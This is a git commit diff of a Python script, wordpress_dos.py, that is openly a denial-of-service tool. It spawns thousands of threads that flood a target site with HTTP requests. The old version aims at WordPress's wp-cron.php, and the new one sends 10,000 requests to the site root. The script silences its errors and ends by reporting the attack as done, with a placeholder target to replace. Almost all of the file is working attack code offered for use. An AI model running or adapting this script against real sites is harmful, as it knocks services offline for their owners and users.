1319945c73d643498f384d27c831a2bbdbbc323a
Manuel Ramos <85370678+SrPatoMan@users.noreply.github.com>
2024-06-08 04:08:13 +0200

    wordpress_dos.py

--- wordpress_dos.py
+++ wordpress_dos.py
@@ -1,35 +1,45 @@
 ################ Author = SrPatoMan ################
-### Linkedin: 
+### Linkedin: https://www.linkedin.com/in/manuel-ramos-martin-769405308/
 
 import socket
 import threading
+import sys
 
-target_addr = 'example.com' # CHANGE THIS
-target_port = 443 # CHANGE THIS IF YOU NEED
+##### CHANGE THIS #####
 
-# SOCKET CLIENTE
+
+target_addr = 'example.com' # Target domain
+target_port = 80 # Target port
+total_requests = 10000 # Total requests number
+
+sys.stderr = open("/dev/null", "w")
+
+# Client socket
 socket_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# DoS atacando al wp-cron.php 
+# Performing a DoS via wp-cron.php 
 
 def DoS():
     
     socket_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     socket_cliente.connect((target_addr, target_port))
-    socket_cliente.send(f"GET /wp-cron.php HTTP/1.1\r\nHost: {target_addr}\r\n\r\n".encode())
+    socket_cliente.send(f"GET / HTTP/1.1\r\nHost: {target_addr}\r\n\r\n".encode())
     socket_cliente.close()
 
-# CREACION DE MULTIPLES HILOS PARA LA DENEGACIÓN
+# Threads
 
 hilos = []
 
-for _ in range(20000):
+for _ in range(total_requests):
     hilo = threading.Thread(target=DoS)
     hilo.start()
     hilos.append(hilo)
 
 
+
+
 for hilos_terminados in hilos:
     hilos_terminados.join()
 
-print("\n\nDoS completado con exito\n\n")
+
+print("\n\n[+] DoS completado con exito\n\n")
